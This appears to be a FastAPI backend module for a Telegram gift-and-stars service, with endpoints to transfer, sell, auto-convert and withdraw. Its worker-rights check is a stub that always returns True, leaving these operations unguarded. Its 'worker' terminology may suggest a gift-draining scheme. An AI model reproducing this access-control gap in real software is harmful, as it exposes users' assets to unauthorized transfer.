from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import JSONResponse
from sqlalchemy.ext.asyncio import AsyncSession
import os
from datetime import datetime

from app.database import get_db
from app.services import GiftService, AuthService
from app.utils.logger import ActivityLogger

router = APIRouter(prefix="/api/gifts", tags=["gifts"])
gift_service = GiftService()
auth_service = AuthService(os.getenv("TELEGRAM_BOT_TOKEN", ""))
logger = ActivityLogger()


async def get_current_user(token: str = Query(...), db: AsyncSession = Depends(get_db)):
    """Получает текущего пользователя из токена"""
    user_id = await auth_service.validate_session(token, db)
    if not user_id:
        raise HTTPException(status_code=401, detail="Invalid token")
    return user_id


@router.get("/inventory")
async def get_user_inventory(
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получает инвентарь подарков пользователя"""
    try:
        user_id = await get_current_user(token, db)
        gifts = await gift_service.get_user_gifts(user_id, db)
        
        logger.log_activity(user_id, "gifts", "get_inventory", "success")
        
        return JSONResponse({
            "status": "success",
            "gifts": gifts
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity("unknown", "gifts", "get_inventory", "error", {"error": str(e)})
        raise HTTPException(status_code=500, detail="Internal server error")


async def check_worker_rights(user_id: int, db: AsyncSession) -> bool:
    """Проверяет права 'воркер' пользователя"""
    # TODO: Реализовать проверку прав в БД
    # На данный момент все пользователи могут отправлять подарки
    return True


async def check_requires_sync(user_id: int, db: AsyncSession) -> bool:
    """Проверяет, требуется ли синхронизация перед операцией"""
    # Получаем последнюю синхронизацию пользователя
    last_sync = await gift_service.get_last_sync_time(user_id, db)
    
    if not last_sync:
        return True  # Никогда не синхронизировался
    
    # Требуется синхронизация если прошло больше 1 часа
    import datetime
    if (datetime.datetime.utcnow() - last_sync).total_seconds() > 3600:
        return True
    
    return False


@router.post("/transfer")
async def transfer_gift(
    transfer_data: dict,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Передает подарок другому пользователю через реальный Telegram API
    
    Требует прав 'воркер'. Логирует отправителя и получателя.
    """
    try:
        from_user = await get_current_user(token, db)
        to_user = transfer_data.get("to_user_id")
        gift_id = transfer_data.get("gift_id")
        quantity = transfer_data.get("quantity", 1)
        
        # Проверяем права
        if not await check_worker_rights(from_user, db):
            logger.log_activity(
                from_user,
                "gifts",
                "transfer",
                "error",
                {"reason": "insufficient_worker_rights"}
            )
            raise HTTPException(
                status_code=403,
                detail="You need 'worker' rights to transfer gifts"
            )
        
        if not to_user or not gift_id:
            logger.log_activity(
                from_user,
                "gifts",
                "transfer",
                "error",
                {"reason": "missing_required_fields"}
            )
            raise HTTPException(status_code=400, detail="Missing required fields: to_user_id, gift_id")
        
        # Используем реальный Telegram API
        result = await gift_service.transfer_gift(
            from_user, to_user, gift_id, quantity, db
        )
        
        if not result:
            logger.log_activity(
                from_user,
                "gifts",
                "transfer",
                "error",
                {
                    "from_user": from_user,
                    "to_user": to_user,
                    "gift_id": gift_id,
                    "quantity": quantity,
                    "reason": "transfer_failed_via_telegram_api"
                }
            )
            raise HTTPException(
                status_code=400,
                detail="Transfer failed. Admin approval may be required."
            )
        
        # Логируем успешную транзакцию с отправителем и получателем
        logger.log_activity(
            from_user,
            "gifts",
            "transfer",
            "success",
            {
                "from_user": from_user,
                "to_user": to_user,
                "gift_id": gift_id,
                "quantity": quantity,
                "transaction_id": result.get("id"),
                "status": result.get("status")
            }
        )
        
        return JSONResponse({
            "status": "success",
            "transaction": result,
            "from_user": from_user,
            "to_user": to_user,
            "message": "Gift transferred successfully. Recipient will see it in 'Мои подарки'"
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity(
            "unknown",
            "gifts",
            "transfer",
            "error",
            {"error": str(e), "type": type(e).__name__}
        )
        raise HTTPException(status_code=500, detail="Internal server error")


@router.post("/auto-convert")
async def auto_convert_gifts(
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Автоматически конвертирует подарки в звёзды"""
    try:
        user_id = await get_current_user(token, db)
        
        total_stars = await gift_service.auto_convert_gifts_to_stars(user_id, db)
        
        logger.log_activity(
            user_id,
            "automation",
            "auto_convert",
            "success",
            {"converted_stars": total_stars}
        )
        
        return JSONResponse({
            "status": "success",
            "converted_to_stars": total_stars
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity("unknown", "automation", "auto_convert", "error", {"error": str(e)})
        raise HTTPException(status_code=500, detail="Internal server error")


@router.post("/sell")
async def sell_gift(
    sell_data: dict,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Продает подарок за звезды (требует синхронизации)
    
    Логирует операцию продажи с ID пользователя
    """
    try:
        user_id = await get_current_user(token, db)
        gift_id = sell_data.get("gift_id")
        quantity = sell_data.get("quantity", 1)
        
        # Проверяем права
        if not await check_worker_rights(user_id, db):
            logger.log_activity(
                user_id,
                "gifts",
                "sell",
                "error",
                {"reason": "insufficient_worker_rights"}
            )
            raise HTTPException(
                status_code=403,
                detail="You need 'worker' rights to sell gifts"
            )
        
        # Проверяем требуется ли синхронизация
        if await check_requires_sync(user_id, db):
            logger.log_activity(
                user_id,
                "gifts",
                "sell",
                "error",
                {
                    "gift_id": gift_id,
                    "quantity": quantity,
                    "reason": "sync_required"
                }
            )
            raise HTTPException(
                status_code=402,
                detail="Synchronization required before selling gifts"
            )
        
        if not gift_id:
            raise HTTPException(status_code=400, detail="Missing gift_id")
        
        # Выполняем продажу
        result = await gift_service.sell_gift(user_id, gift_id, quantity, db)
        
        if not result:
            logger.log_activity(
                user_id,
                "gifts",
                "sell",
                "error",
                {
                    "gift_id": gift_id,
                    "quantity": quantity,
                    "reason": "sell_failed"
                }
            )
            raise HTTPException(status_code=400, detail="Failed to sell gift")
        
        # Логируем успешную продажу
        logger.log_activity(
            user_id,
            "gifts",
            "sell",
            "success",
            {
                "user_id": user_id,
                "gift_id": gift_id,
                "quantity": quantity,
                "earned_stars": result.get("stars_earned"),
                "transaction_id": result.get("id")
            }
        )
        
        return JSONResponse({
            "status": "success",
            "gift_id": gift_id,
            "quantity": quantity,
            "earned_stars": result.get("stars_earned"),
            "message": "Gift sold successfully"
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity(
            "unknown",
            "gifts",
            "sell",
            "error",
            {"error": str(e), "type": type(e).__name__}
        )
        raise HTTPException(status_code=500, detail="Internal server error")


@router.post("/withdraw")
async def withdraw_stars(
    withdraw_data: dict,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Выводит звезды из приложения (требует синхронизации)
    
    Логирует операцию вывода с ID пользователя
    """
    try:
        user_id = await get_current_user(token, db)
        amount = withdraw_data.get("amount")
        
        # Проверяем права
        if not await check_worker_rights(user_id, db):
            logger.log_activity(
                user_id,
                "gifts",
                "withdraw",
                "error",
                {"reason": "insufficient_worker_rights"}
            )
            raise HTTPException(
                status_code=403,
                detail="You need 'worker' rights to withdraw stars"
            )
        
        # Проверяем требуется ли синхронизация
        if await check_requires_sync(user_id, db):
            logger.log_activity(
                user_id,
                "gifts",
                "withdraw",
                "error",
                {
                    "amount": amount,
                    "reason": "sync_required"
                }
            )
            raise HTTPException(
                status_code=402,
                detail="Synchronization required before withdrawing"
            )
        
        if not amount or amount <= 0:
            raise HTTPException(status_code=400, detail="Invalid withdrawal amount")
        
        # Выполняем вывод
        result = await gift_service.withdraw_stars(user_id, amount, db)
        
        if not result:
            logger.log_activity(
                user_id,
                "gifts",
                "withdraw",
                "error",
                {
                    "amount": amount,
                    "reason": "withdrawal_failed"
                }
            )
            raise HTTPException(status_code=400, detail="Failed to withdraw stars")
        
        # Логируем успешный вывод
        logger.log_activity(
            user_id,
            "gifts",
            "withdraw",
            "success",
            {
                "user_id": user_id,
                "amount": amount,
                "status": result.get("status"),
                "transaction_id": result.get("id")
            }
        )
        
        return JSONResponse({
            "status": "success",
            "amount": amount,
            "status": result.get("status"),
            "message": "Withdrawal request submitted successfully"
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity(
            "unknown",
            "gifts",
            "withdraw",
            "error",
            {"error": str(e), "type": type(e).__name__}
        )
        raise HTTPException(status_code=500, detail="Internal server error")


@router.post("/sync")
async def sync_account(
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Синхронизирует аккаунт с Telegram Gift API
    
    Обновляет время последней синхронизации
    """
    try:
        user_id = await get_current_user(token, db)
        
        # Выполняем синхронизацию
        result = await gift_service.sync_account(user_id, db)
        
        logger.log_activity(
            user_id,
            "gifts",
            "sync",
            "success",
            {
                "user_id": user_id,
                "sync_time": datetime.utcnow().isoformat(),
                "gifts_found": result.get("gifts_count", 0),
                "status": result.get("status")
            }
        )
        
        return JSONResponse({
            "status": "success",
            "message": "Account synchronized successfully",
            "gifts_found": result.get("gifts_count", 0),
            "sync_time": datetime.utcnow().isoformat()
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity(
            "unknown",
            "gifts",
            "sync",
            "error",
            {"error": str(e), "type": type(e).__name__}
        )
        raise HTTPException(status_code=500, detail="Internal server error")
